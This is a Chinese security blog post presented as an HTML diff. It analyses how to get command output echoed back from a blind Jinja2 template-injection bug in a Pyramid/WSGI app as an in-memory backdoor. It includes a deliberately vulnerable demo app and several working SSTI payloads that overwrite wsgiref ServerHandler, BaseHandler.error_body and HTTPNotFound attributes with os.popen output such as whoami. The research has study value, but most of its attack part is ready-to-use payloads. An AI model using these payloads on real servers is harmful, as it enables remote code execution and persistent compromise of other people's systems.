@@ -1,0 +1,157 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="807320d3cb40cbe5c3372e3c89f65cff">WSGI内存马无回显详细调试挖掘</h2>
+<p><strong>Pyramid</strong> 是一个灵活且功能强大的 Python Web 框架，完全兼容 <strong>WSGI</strong>（Web Server Gateway Interface）。通过 WSGI，Pyramid 能够运行在任何 WSGI 兼容的 Web 服务器上（如 Gunicorn、uWSGI 等），并且可以通过中间件进行扩展和集成。<br/>
+测试demo如下</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">jinja2</span>
+<span class="kn">from</span> <span class="nn">pyramid.config</span> <span class="kn">import</span> <span class="n">Configurator</span>
+<span class="kn">from</span> <span class="nn">pyramid.httpexceptions</span> <span class="kn">import</span> <span class="n">HTTPFound</span>
+<span class="kn">from</span> <span class="nn">pyramid.response</span> <span class="kn">import</span> <span class="n">Response</span>
+<span class="kn">from</span> <span class="nn">pyramid.session</span> <span class="kn">import</span> <span class="n">SignedCookieSessionFactory</span>
+<span class="kn">from</span> <span class="nn">wsgiref.simple_server</span> <span class="kn">import</span> <span class="n">make_server</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+
+<span class="k">def</span> <span class="nf">shell_view</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+
+    <span class="n">expression</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">GET</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'shellcmd'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
+    <span class="n">blacklist_patterns</span> <span class="o">=</span> <span class="p">[</span><span class="sa">r</span><span class="s1">'.*length.*'</span><span class="p">]</span>
+    <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">expression</span><span class="p">)</span> <span class="k">for</span> <span class="n">pattern</span> <span class="ow">in</span> <span class="n">blacklist_patterns</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">'wafwafwaf'</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">jinja2</span><span class="o">.</span><span class="n">Environment</span><span class="p">(</span><span class="n">loader</span><span class="o">=</span><span class="n">jinja2</span><span class="o">.</span><span class="n">BaseLoader</span><span class="p">())</span><span class="o">.</span><span class="n">from_string</span><span class="p">(</span><span class="n">expression</span><span class="p">)</span><span class="o">.</span><span class="n">render</span><span class="p">({</span><span class="s2">"request"</span><span class="p">:</span> <span class="n">request</span><span class="p">})</span>
+        <span class="k">if</span> <span class="n">result</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">'success'</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">'error'</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">'error'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">session_factory</span> <span class="o">=</span> <span class="n">SignedCookieSessionFactory</span><span class="p">(</span><span class="s1">'secret_key'</span><span class="p">)</span>
+    <span class="k">with</span> <span class="n">Configurator</span><span class="p">(</span><span class="n">session_factory</span><span class="o">=</span><span class="n">session_factory</span><span class="p">)</span> <span class="k">as</span> <span class="n">config</span><span class="p">:</span>
+        <span class="n">config</span><span class="o">.</span><span class="n">include</span><span class="p">(</span><span class="s1">'pyramid_chameleon'</span><span class="p">)</span>  <span class="c1"># 添加渲染模板</span>
+        <span class="n">config</span><span class="o">.</span><span class="n">set_default_permission</span><span class="p">(</span><span class="s1">'view'</span><span class="p">)</span>  <span class="c1"># 设置默认权限为view</span>
+
+        <span class="c1"># 注册路由</span>
+        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">'root'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">)</span>
+        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">'shell'</span><span class="p">,</span> <span class="s1">'/shell'</span><span class="p">)</span>
+        <span class="c1"># 注册视图</span>
+        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">shell_view</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">'shell'</span><span class="p">,</span> <span class="n">renderer</span><span class="o">=</span><span class="s1">'string'</span><span class="p">,</span> <span class="n">permission</span><span class="o">=</span><span class="s1">'view'</span><span class="p">)</span>
+
+        <span class="n">config</span><span class="o">.</span><span class="n">scan</span><span class="p">()</span>
+        <span class="n">app</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">make_wsgi_app</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">app</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="n">app</span> <span class="o">=</span> <span class="n">main</span><span class="p">()</span>
+    <span class="n">server</span> <span class="o">=</span> <span class="n">make_server</span><span class="p">(</span><span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="mi">6543</span><span class="p">,</span> <span class="n">app</span><span class="p">)</span>
+    <span class="n">server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+</pre></div>
+<h3 data-content="1" id="e753a6ada24fa4ed00bb322431fcaf0e">响应包回显调试分析</h3>
+<p>我们调试跟进app的创建函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241211163449-c8d72eac-b79a-1.png"/></p>
+<p>审计<strong>Pyramid</strong> 框架的 WSGI 应用程序创建的代码</p>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">make_wsgi_app</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>  
+    <span class="sd">"""Commits any pending configuration statements, sends a  </span>
+<span class="sd">    :class:`pyramid.events.ApplicationCreated` event to all listeners,    adds this configuration's registry to    :attr:`pyramid.config.global_registries`, and returns a    :app:`Pyramid` WSGI application representing the committed    configuration state."""</span>    <span class="bp">self</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>  
+    <span class="n">app</span> <span class="o">=</span> <span class="n">Router</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">registry</span><span class="p">)</span>  
+
+    <span class="c1"># Allow tools like "pshell development.ini" to find the 'last'  </span>
+    <span class="c1"># registry configured.    global_registries.add(self.registry)  </span>
+
+    <span class="c1"># Push the registry onto the stack in case any code that depends on  </span>
+    <span class="c1"># the registry threadlocal APIs used in listeners subscribed to the    # IApplicationCreated event.    self.begin()  </span>
+    <span class="k">try</span><span class="p">:</span>  
+        <span class="bp">self</span><span class="o">.</span><span class="n">registry</span><span class="o">.</span><span class="n">notify</span><span class="p">(</span><span class="n">ApplicationCreated</span><span class="p">(</span><span class="n">app</span><span class="p">))</span>  
+    <span class="k">finally</span><span class="p">:</span>  
+        <span class="bp">self</span><span class="o">.</span><span class="n">end</span><span class="p">()</span>  
+
+    <span class="k">return</span> <span class="n">app</span>
+</pre></div>
+<p>发现首先调用了commit方法提交配置变更提交所有挂起的配置语句，将此配置的注册表添加到 :attr:<code>pyramid.config.global_registries</code>，并返回一个  app:<code>Pyramid</code> WSGI 应用程序</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241211163459-cebdc90c-b79a-1.png"/></p>
+<p>app创建完成之后，调用<code>make_server</code>创建server服务程序</p>
+<div class="highlight"><pre><span></span><span class="n">server</span> <span class="o">=</span> <span class="n">make_server</span><span class="p">(</span><span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="mi">6543</span><span class="p">,</span> <span class="n">app</span><span class="p">)</span>
+</pre></div>
+<p>跟进方法查看<code>make_server</code>源码</p>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">make_server</span><span class="p">(</span>  
+    <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">app</span><span class="p">,</span> <span class="n">server_class</span><span class="o">=</span><span class="n">WSGIServer</span><span class="p">,</span> <span class="n">handler_class</span><span class="o">=</span><span class="n">WSGIRequestHandler</span>  
+<span class="p">):</span>  
+    <span class="sd">"""Create a new WSGI server listening on `host` and `port` for `app`"""</span>  
+    <span class="n">server</span> <span class="o">=</span> <span class="n">server_class</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="n">handler_class</span><span class="p">)</span>  
+    <span class="n">server</span><span class="o">.</span><span class="n">set_app</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>  
+    <span class="k">return</span> <span class="n">server</span>
+</pre></div>
+<p>我们注意到了类似flask无回显挖掘过程中的handler处理类：<strong>WSGIRequestHandler</strong><br/>
+我们发送请求包调试跟进找到handle类</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241211163508-d4313e28-b79a-1.png"/></p>
+<p>不断跟进，从run方法进入到finish_response()</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241211163517-d9aa4566-b79a-1.png"/></p>
+<p>接着跟踪进入write方法和werkzeug的write几乎一样</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241211163531-e2294156-b79a-1.png"/></p>
+<p>进入send_hearders方法调用</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241211163851-5954eba4-b79b-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">send_headers</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="sd">"""Transmit headers to the client, via self._write()"""</span>
+<span class="bp">self</span><span class="o">.</span><span class="n">cleanup_headers</span><span class="p">()</span>
+<span class="bp">self</span><span class="o">.</span><span class="n">headers_sent</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">origin_server</span> <span class="ow">or</span> <span class="bp">self</span><span class="o">.</span><span class="n">client_is_modern</span><span class="p">():</span>
+    <span class="bp">self</span><span class="o">.</span><span class="n">send_preamble</span><span class="p">()</span>
+    <span class="bp">self</span><span class="o">.</span><span class="n">_write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">))</span>
+</pre></div>
+<p>接入调入<strong>send_preamble</strong>方法找到我们的最终点，可以看到<strong>http_version，status,server_software</strong>变量被写入响应头，那么我们覆盖这些变量不就可以回显了？</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241211163904-60d15444-b79b-1.png"/></p>
+<p>首先我们需要拿到handler类</p>
+<div class="highlight"><pre><span></span><span class="n">wsgiref</span><span class="o">.</span><span class="n">simple_server</span><span class="o">.</span><span class="n">ServerHandler</span>
+</pre></div>
+<blockquote>
+<p>sys.modules是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，sys.modules都将记录这些模块。字典sys.modules对于加载模块起到了缓冲的作用。当某个模块第一次导入，字典sys.modules将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。</p>
+</blockquote>
+<p>我们可以先拿到sys再从模块中拿到wsgiref</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span>lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler<span class="p">}}</span>
+</pre></div>
+<p>然后设置变量属性进行回显</p>
+<h4 data-content="1" id="5bcec87553f6451ca610bc29ec46d6c2">HTTP协议头回显</h4>
+<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">lipsum</span><span class="o">.</span><span class="n">__spec__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">wsgiref</span><span class="o">.</span><span class="n">simple_server</span><span class="o">.</span><span class="n">ServerHandler</span><span class="p">,</span><span class="s2">"http_version"</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'echo test'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241211163925-6d2542d2-b79b-1.png"/></p>
+<h4 data-content="1" id="7e06ab477f0e64678050ef5d7b288f24">Server字段回显</h4>
+<p>同样server_software也可以用来回显</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">lipsum</span><span class="o">.</span><span class="n">__spec__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">wsgiref</span><span class="o">.</span><span class="n">simple_server</span><span class="o">.</span><span class="n">ServerHandler</span><span class="p">,</span><span class="s2">"server_software"</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'echo 111'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241211163933-72628480-b79b-1.png"/></p>
+<h3 data-content="1" id="02a671b3871fe6480a8d4438df66dd3b">HTTP错误回显</h3>
+<h4 data-content="1" id="4ec49d9a9788d6637259fd6e926b6085">500状态码</h4>
+<p>当我触发时页面回显如下字段</p>
+<div class="highlight"><pre><span></span>A server error occurred.  Please contact the administrator.
+</pre></div>
+<p>我们从源代码中搜索定位，发现是Basehandler的一个属性<strong>error_body</strong></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241211163947-7a372ae4-b79b-1.png"/></p>
+<p>注意<code>error_body</code>类型是<code>bytes</code>类型  ，所以我们可以对<code>read()</code>返回回来的数据实现encode转换</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">'__globals__'</span><span class="p">][</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'setattr'</span><span class="p">]((((</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'__spec__'</span><span class="p">))</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'__init__'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'__globals__'</span><span class="p">))[</span><span class="s1">'sys'</span><span class="p">]</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'modules'</span><span class="p">))[</span><span class="s1">'wsgiref'</span><span class="p">]</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'handlers'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'BaseHandler'</span><span class="p">),</span><span class="s1">'error_body'</span><span class="p">,</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">'__globals__'</span><span class="p">][</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'__import__'</span><span class="p">](</span><span class="s1">'os'</span><span class="p">)[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'whoami'</span><span class="p">)[</span><span class="s1">'read'</span><span class="p">]()[</span><span class="s1">'encode'</span><span class="p">]())}}</span>
+
+<span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">lipsum</span><span class="o">.</span><span class="n">__spec__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">wsgiref</span><span class="o">.</span><span class="n">simple_server</span><span class="o">.</span><span class="n">ServerHandler</span><span class="p">,</span><span class="s2">"error_body"</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'echo 111'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
+</pre></div>
+<h4 data-content="1" id="f3da940d3eb4e38c4c085ffb6605ff34">404状态码</h4>
+<p>当我们访问不存在路由时会显示以下字段</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241211163957-807e3f0a-b79b-1.png"/></p>
+<p>根据关键词在源代码定位位置找到<strong>pyramid.httpexceptions.HTTPNotFound类</strong></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241211164005-856d407e-b79b-1.png"/></p>
+<p>我们可以污染属性explanation来404回显</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">'__globals__'</span><span class="p">][</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'exec'</span><span class="p">](</span><span class="s2">"setattr(Not,'explanation',shell)"</span><span class="p">,{</span><span class="s2">"Not"</span><span class="p">:((</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'__spec__'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'__init__'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'__globals__'</span><span class="p">))[</span><span class="s1">'sys'</span><span class="p">]</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'modules'</span><span class="p">))[</span><span class="s1">'pyramid'</span><span class="p">][</span><span class="s1">'httpexceptions'</span><span class="p">][</span><span class="s1">'HTTPNotFound'</span><span class="p">],</span><span class="s2">"shell"</span><span class="p">:</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">'__globals__'</span><span class="p">][</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'__import__'</span><span class="p">](</span><span class="s1">'os'</span><span class="p">)[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'echo 1a1'</span><span class="p">)[</span><span class="s1">'read'</span><span class="p">]()})}}</span>
+</pre></div>
+<p>或者</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">lipsum</span><span class="o">.</span><span class="n">__spec__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">pyramid</span><span class="o">.</span><span class="n">httpexceptions</span><span class="o">.</span><span class="n">HTTPNotFound</span><span class="p">,</span><span class="s2">"explanation"</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'echo 111'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
+</pre></div>
+<p>也可以覆盖属性title来回显</p>
+<div class="highlight"><pre><span></span><span class="p">{{(</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">'__globals__'</span><span class="p">][</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'exec'</span><span class="p">])(</span><span class="s2">"setattr(Not,'title',shell)"</span><span class="p">,{</span><span class="s2">"Not"</span><span class="p">:(((</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'__spec__'</span><span class="p">))</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'__init__'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'__globals__'</span><span class="p">))[</span><span class="s1">'sys'</span><span class="p">]</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'modules'</span><span class="p">))[</span><span class="s1">'pyramid'</span><span class="p">][</span><span class="s1">'httpexceptions'</span><span class="p">][</span><span class="s1">'HTTPNotFound'</span><span class="p">],</span><span class="s2">"shell"</span><span class="p">:</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">'__globals__'</span><span class="p">][</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'__import__'</span><span class="p">](</span><span class="s1">'os'</span><span class="p">)[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'whoami'</span><span class="p">)[</span><span class="s1">'read'</span><span class="p">]()})}}</span>
+</pre></div>
+<p>或者</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">lipsum</span><span class="o">.</span><span class="n">__spec__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">pyramid</span><span class="o">.</span><span class="n">httpexceptions</span><span class="o">.</span><span class="n">HTTPNotFound</span><span class="p">,</span><span class="s2">"title"</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'echo 111'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241211164016-8ba1615a-b79b-1.png"/></p>
+</div>
+</div>
